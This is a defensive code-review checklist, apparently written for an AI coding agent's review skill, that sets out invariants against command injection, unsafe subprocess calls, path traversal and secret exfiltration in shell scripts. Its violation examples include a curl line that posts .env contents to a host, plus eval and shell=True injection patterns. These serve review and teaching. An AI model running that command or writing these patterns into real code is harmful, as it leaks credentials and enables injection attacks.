# Invariants: script & subprocess injection safety

**Area:** shell scripts (`scripts/**`, `.claude/hooks/**`, `*.sh`) and code that
shells out or builds commands/queries from input.

**Default verdict on uncertainty:** unprovable means flag it. Untrusted input
includes anything from PRs, issues, web fetches, env, filenames, and tool
output.

Apply this checklist (via the `domain-adversary-checklist` skill) whenever a
diff touches a script or a subprocess/command-construction path.

## Invariants

1. **No command injection.** Variables that may contain untrusted data are
   quoted (`"$var"`) and never `eval`'d or concatenated into a shell string.
   No `eval "$user_input"`; no `sh -c "… $var …"` with untrusted `$var`.

2. **No unsafe subprocess.** Subprocesses use argument vectors, not a shell
   string built from input (`subprocess.run([...])`, not `shell=True` with an
   interpolated command; `execve`-style, not `system()`).

3. **No path traversal.** Paths derived from input are validated/normalised and
   confined to an expected root; no `../` escape, no writing outside a temp or
   designated directory.

4. **No secret exfiltration.** The script does not read and transmit/print
   credentials, tokens, or `.env` contents; no piping of secrets to network
   commands.

5. **Fail-closed on error.** A failure in a security-relevant path (auth, gate,
   verification) results in denial or a hard error, never a permissive
   fallthrough. `set -euo pipefail` (or equivalent) where a partial run is
   unsafe.

6. **Input bounds.** Loops/reads over untrusted input are bounded; no unbounded
   resource consumption from attacker-controlled size.

## How a violation looks

- `eval "git $user_arg"` / `bash -c "$cmd"` with `$cmd` from input.
- `subprocess.run(f"convert {name}", shell=True)` with user `name`.
- `open(os.path.join(base, user_path))` without confining `user_path`.
- `curl -d "$(cat .env)" https://…` or echoing a token to logs.
- An `if err != nil { /* ignore */ }` on a verification step (fail-open).
